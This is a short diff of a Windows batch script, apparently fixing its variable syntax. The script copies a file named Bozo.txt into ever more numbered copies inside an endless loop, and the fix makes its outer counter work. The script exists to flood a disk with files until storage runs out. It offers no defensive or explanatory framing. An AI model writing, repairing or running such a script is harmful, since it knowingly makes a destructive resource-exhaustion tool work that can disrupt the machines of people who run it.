@@ -9,7 +9,7 @@ copy Bozo.txt Bozo%%x.txt
 del Bozo.txt
 :start
 for /l %%x in (1, 1, 1000) do (
-copy Bozo.txt Bozo%%y%%x.txt
+copy Bozo.txt Bozo%y%%%x.txt
 )
-set /A y = %%y + 1
+set /A y = %y% + 1
 goto :Start
